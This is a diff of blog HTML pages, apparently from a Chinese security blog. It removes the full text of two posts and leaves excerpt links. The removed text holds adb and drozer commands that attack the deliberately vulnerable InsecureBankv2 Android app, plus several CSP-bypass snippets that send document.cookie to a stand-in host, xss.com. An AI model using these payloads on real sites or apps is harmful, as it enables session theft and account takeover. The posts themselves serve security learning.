class="line">localIntent.setAction(&quot;theBroadcast&quot;);</div><div class="line">localIntent.putExtra(&quot;phonenumber&quot;, paramString1);</div><div class="line">localIntent.putExtra(&quot;newpass&quot;, paramString2);</div><div class="line">sendBroadcast(localIntent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<ul>
-<li>直接调用am命令：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播</div></pre></td></tr></table></figure>
-<ul>
-<li>可以使用drozer 启动：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad</div></pre></td></tr></table></figure>
-<h3 id="hack-数据库，provider"><a href="#hack-数据库，provider" class="headerlink" title="hack 数据库，provider"></a>hack 数据库，provider</h3><ul>
-<li><p>drozer里面的命令<code>run scanner.provider.finduris -a com.android.insecurebankv2</code><br>扫描可以利用的provider</p>
-</li>
-<li><p>利用 <code>run app.provider.query</code> 进行查询  </p>
-</li>
-<li><p>在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看</div></pre></td></tr></table></figure>
-<h3 id="攻击复制的数据"><a href="#攻击复制的数据" class="headerlink" title="攻击复制的数据"></a>攻击复制的数据</h3><p><code>adb shell su u0_a51 service call clipboard 2 s16 包名</code></p>
-<h3 id="攻击数据库"><a href="#攻击数据库" class="headerlink" title="攻击数据库"></a>攻击数据库</h3><p>若是数据库没有加密的话，直接pull下来，查看即可</p>
-<h3 id="不安全的log"><a href="#不安全的log" class="headerlink" title="不安全的log"></a>不安全的log</h3><p>直接ddms或者adb logcat读取敏感数据</p>
-<h3 id="导出内存数据（未测试）"><a href="#导出内存数据（未测试）" class="headerlink" title="导出内存数据（未测试）"></a>导出内存数据（未测试）</h3><p>ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof  SSSSS.hprof格式化，利用app的内存分析工具分析内存。</p>
-<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p>在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理</p>
-
+        
+          <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/#more">more >></a>
+        
       
 
       
@@ -1105,24 +687,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>dns 預读取</li>
-</ol>
-<p>firefox</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
-<p>chrome</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
-<ol>
-<li>通用的bypass</li>
-</ol>
-<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>比如动态创建元素,再引发页面跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
-<p>或者是使用<meta>标签进行跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
-
+        <p>绕过CSP发送cookie</p>
+        
+          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/#more">more >></a>
+        
       
 
       
